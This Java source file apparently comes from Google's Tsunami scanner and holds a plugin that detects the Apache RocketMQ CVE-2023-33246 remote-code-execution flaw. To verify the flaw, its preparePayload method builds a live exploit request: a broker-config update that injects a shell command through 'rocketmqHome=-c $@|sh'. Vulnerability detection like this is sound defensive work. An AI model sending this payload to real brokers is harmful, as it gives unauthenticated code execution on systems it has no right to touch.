/*
 * Copyright 2024 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.rce.cve202333246;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.time.Clock;
import java.time.Instant;
import javax.inject.Inject;

/** A Tsunami plugin that detects RocketMQ RCE vulnerability CVE-2023-33246. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "RocketMQ_CVE202333246Detector",
    version = "0.1",
    description = "This plugin detects the RocketMQ CVE-2023-33246 RCE vulnerability.",
    author = "Raul Mijan (raul@doyensec.com)",
    bootstrapModule = RocketMQ_CVE202333246DetectorBootstrapModule.class)
public final class RocketMQ_CVE202333246Detector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private static final String VULNERABILITY_ID = "CVE-2023-33246";
  private static final String VULNERABILITY_DESCRIPTION =
      "Apache RocketMQ allows unauthenticated attackers to modify the broker configuration "
          + "through a command injection vulnerability, leading to remote code execution.";
  private static final String VULNERABILITY_RECOMMENDATION =
      "Remove RocketMQ from internet exposure and apply the latest patches to mitigate the issue.";

  private static final String ROCKETMQ_RESPONSE_INDICATOR = "serializeTypeCurrentRPC";

  private final Clock utcClock;
  private final PayloadGenerator payloadGenerator;

  @Inject
  RocketMQ_CVE202333246Detector(@UtcClock Clock utcClock, PayloadGenerator payloadGenerator) {
      this.utcClock = checkNotNull(utcClock);
      this.payloadGenerator = checkNotNull(payloadGenerator);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Starting detection of RocketMQ CVE-2023-33246.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isRocketMQService)
                .filter(this::isServiceVulnerable)
                .map(service -> buildDetectionReport(targetInfo, service))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isRocketMQService(NetworkService service) {
    logger.atInfo().log("Checking if the service is a RocketMQ service.");

    byte[] probePayload = prepareProbePayload();
    try (var socket = new java.net.Socket(
            service.getNetworkEndpoint().getIpAddress().getAddress(),
            service.getNetworkEndpoint().getPort().getPortNumber())) {
      socket.getOutputStream().write(probePayload);
      byte[] response = new byte[4096];
      int bytesRead = socket.getInputStream().read(response);
      String responseStr = new String(response, 0, bytesRead, java.nio.charset.StandardCharsets.UTF_8);
      if (responseStr.contains(ROCKETMQ_RESPONSE_INDICATOR)) {
        logger.atInfo().log("Service identified as RocketMQ.");
        return true;
      } else {
        logger.atInfo().log("Service does not appear to be RocketMQ.");
        return false;
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Failed to connect to the service at %s.", service.getNetworkEndpoint());
      return false;
    }
  }

  private boolean isServiceVulnerable(NetworkService service) {
    logger.atInfo().log("Checking if RocketMQ service is vulnerable.");

    PayloadGeneratorConfig payloadConfig =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.REFLECTIVE_RCE)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
            .setExecutionEnvironment(
                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
            .build();

    Payload payload = payloadGenerator.generate(payloadConfig);
    String command = payload.getPayload();
    byte[] preparedPayload = preparePayload(command);

    try (var socket = new java.net.Socket(
            service.getNetworkEndpoint().getIpAddress().getAddress(), 
            service.getNetworkEndpoint().getPort().getPortNumber())) {
      socket.getOutputStream().write(preparedPayload);
      byte[] response = new byte[1024];
      socket.getInputStream().read(response);

      // Wait 15 seconds before checking for callback
      try {
        Thread.sleep(15000);
      } catch (InterruptedException e) {
        Thread.currentThread().interrupt();
        logger.atWarning().withCause(e).log("Thread was interrupted during sleep.");
      }

      return payload.checkIfExecuted();
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Failed to connect to the RocketMQ service.");
      return false;
    }
  }

  private byte[] preparePayload(String command) {
    int code = 25;
    String jsonHeader = String.format(
        "{\"code\":%d,\"flag\":0,\"language\":\"JAVA\",\"opaque\":0,\"serializeTypeCurrentRPC\":\"JSON\",\"version\":395}",
        code);
    byte[] jsonHeaderBytes = jsonHeader.getBytes(java.nio.charset.StandardCharsets.UTF_8);

    String body = "filterServerNums=1\nrocketmqHome=-c $@|sh . echo " + command + ";\n";
    byte[] bodyBytes = body.getBytes(java.nio.charset.StandardCharsets.UTF_8);

    // Build the payload
    int totalLength = 4 + jsonHeaderBytes.length + bodyBytes.length;
    ByteBuffer buffer = ByteBuffer.allocate(totalLength + 4);
    buffer.putInt(totalLength);
    buffer.putInt(jsonHeaderBytes.length);
    buffer.put(jsonHeaderBytes);
    buffer.put(bodyBytes);
    return buffer.array();
  }

  private byte[] prepareProbePayload() {
    int code = 0;
    String jsonHeader = String.format(
        "{\"code\":%d,\"flag\":0,\"language\":\"JAVA\",\"opaque\":0,\"serializeTypeCurrentRPC\":\"JSON\",\"version\":395}",
        code);
    byte[] jsonHeaderBytes = jsonHeader.getBytes(java.nio.charset.StandardCharsets.UTF_8);

    // No body for probe
    byte[] bodyBytes = new byte[0];

    // Build the payload
    int totalLength = 4 + jsonHeaderBytes.length + bodyBytes.length;
    ByteBuffer buffer = ByteBuffer.allocate(totalLength + 4);
    buffer.putInt(totalLength);
    buffer.putInt(jsonHeaderBytes.length);
    buffer.put(jsonHeaderBytes);
    buffer.put(bodyBytes);
    return buffer.array();
  }

  private DetectionReport buildDetectionReport(TargetInfo targetInfo, NetworkService service) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(service)
        .setDetectionTimestamp(
            com.google.protobuf.util.Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue(VULNERABILITY_ID))
                .setSeverity(Severity.CRITICAL)
                .setTitle("RocketMQ Remote Code Execution Vulnerability (CVE-2023-33246)")
                .setDescription(VULNERABILITY_DESCRIPTION)
                .setRecommendation(VULNERABILITY_RECOMMENDATION))
        .build();
  }
}